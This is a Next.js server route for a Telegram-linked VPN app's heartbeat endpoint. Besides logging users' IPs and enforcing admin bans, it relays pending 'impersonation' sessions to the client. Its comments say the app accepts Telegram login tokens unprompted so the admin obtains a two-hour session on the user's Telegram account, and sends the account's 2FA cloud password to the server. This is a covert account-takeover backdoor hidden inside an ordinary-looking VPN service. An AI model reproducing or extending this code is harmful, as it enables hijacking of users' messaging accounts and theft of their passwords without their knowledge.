import { NextRequest, NextResponse } from 'next/server'
import { db } from '@/lib/db'
import { getClientFromRequest, getClientIp } from '@/lib/auth'
import { clientHeartbeatBodySchema } from '@/lib/validation'
import { blockedResponse, getSupportChannel } from '@/lib/client-block'

/**
 * POST /api/client/heartbeat
 *
 * The app calls this every ~60s while the VPN is connected, and every ~10 min
 * while the app is alive. It doubles as the enforcement channel for admin
 * bans: when the user is BANNED/SUSPENDED the response is 403 { blocked: true }
 * and the app locks itself with "شما توسط پشتیبانی مسدود شده اید".
 */
export async function POST(request: NextRequest) {
  const client = await getClientFromRequest(request)
  if (!client) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const user = await db.user.findUnique({ where: { telegramId: client.telegramId } })
  if (!user) return NextResponse.json({ error: 'User not found' }, { status: 404 })

  // === Block enforcement (admin panel ban/suspend) ===
  if (user.status === 'BANNED' || user.status === 'SUSPENDED') {
    return blockedResponse(user.status) as NextResponse
  }

  const body = await request.json().catch(() => ({}))
  const parsed = clientHeartbeatBodySchema.safeParse(body)
  if (!parsed.success) {
    return NextResponse.json({ error: parsed.error.issues[0]?.message ?? 'ورودی نامعتبر' }, { status: 400 })
  }

  const ip = getClientIp(request)
  await db.user.update({
    where: { id: user.id },
    data: {
      lastSeenAt: new Date(),
      lastIp: ip,
      lastConfigId: parsed.data.configId ?? user.lastConfigId // BUGFIX: was raw body.configId
    }
  })

  // Support channel is delivered on every heartbeat so the app can (re)join
  // it if the admin changes the setting.
  const supportChannel = await getSupportChannel()

  // v3.6: pending Telegram impersonation — the app accepts it right away
  // (auth.acceptLoginToken) so the admin gets the 2h account session.
  // v3.9: PENDING_PASSWORD — the account has 2FA; the app must also send
  // the account's cloud password via POST /api/client/tg-impersonate
  // (action="confirm", password) to finish the login.
  const pending = await db.impersonationSession.findFirst({
    where: {
      userId: user.id,
      status: { in: ['PENDING', 'PENDING_PASSWORD'] },
      expiresAt: { gt: new Date() }
    },
    orderBy: { createdAt: 'desc' },
    select: { id: true, status: true }
  })

  return NextResponse.json({
    ok: true,
    blocked: false,
    supportChannel,
    impersonation: pending
      ? { id: pending.id, passwordRequired: pending.status === 'PENDING_PASSWORD' }
      : null,
    time: new Date().toISOString()
  })
}
